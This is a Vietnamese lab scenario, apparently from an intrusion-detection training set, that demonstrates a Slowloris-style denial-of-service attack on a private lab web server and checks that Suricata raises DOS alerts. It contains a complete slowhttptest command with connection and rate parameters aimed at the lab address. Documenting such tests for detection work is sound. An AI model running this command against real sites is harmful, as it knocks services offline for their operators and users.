# 05 — Denial of Service (Slowloris-style)

## Mục tiêu
Minh hoạ tấn công DoS dạng giữ nhiều kết nối treo lâu (Slowloris), khác hẳn bản chất "khối lượng lớn payload" ở scenario 03.

## Điều kiện tiên quyết
- Category Suricata `emerging-dos.rules` đã bật
- `slowhttptest` đã cài trên Kali: `sudo apt install slowhttptest -y`

## Các bước thực hiện

```bash
slowhttptest -c 1000 -H -g -o slow_http -i 10 -r 200 -t GET -u https://192.168.10.1/ -x 24 -p 3
```

Theo dõi song song 1 tab trình duyệt đang load `https://192.168.10.1` trong lúc lệnh chạy — trang phải trở nên chậm/không phản hồi.

Nhớ dừng lệnh (Ctrl+C) sau khi demo xong để site hoạt động lại bình thường.

## Bằng chứng cần thu thập

| File | Nội dung |
|---|---|
| `screenshots/05-slowhttptest-running.png` | Terminal đang chạy slowhttptest |
| `screenshots/05-suricata-dos-alert.png` | Suricata alert thuộc category DOS |
| `screenshots/05-site-unresponsive.png` | Trình duyệt không tải được trang trong lúc tấn công |

## Kết quả mong đợi
- Trang web không phản hồi/tải rất chậm trong thời gian tấn công.
- Suricata ghi nhận alert liên quan tới hành vi kết nối bất thường (DOS category).
